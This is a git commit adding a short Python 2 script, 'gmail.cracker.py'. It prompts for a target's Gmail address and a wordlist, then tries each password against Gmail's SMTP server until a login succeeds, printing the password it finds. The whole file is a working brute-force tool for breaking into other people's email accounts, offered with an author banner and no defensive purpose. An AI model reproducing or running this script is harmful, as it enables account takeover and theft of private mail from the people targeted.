9aadec1188cc9d512f2b24b3dc343b1f40262b35
pishi07 <77379973+pishi07@users.noreply.github.com>
2021-01-13 11:39:20 +0330

    crack,py

---
+++ gmail.cracker.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*- 
+from termcolor import colored
+import re
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+def display_info():                                        
+        print colored('\r\n¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
+	print colored(' \t by; h.pishin07	')
+	print colored( '     pishiiiiiiiiii')
+        print colored( 'iran')   
+	print colored('¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
+print "\r\n"
+display_info()
+user = raw_input("Enter the target's email address: ")
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+	try:
+		smtpserver.login(user, password)
+
+		print "[+] Password Found: %s" % password
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print "[!] Password Incorrect: %s" % password
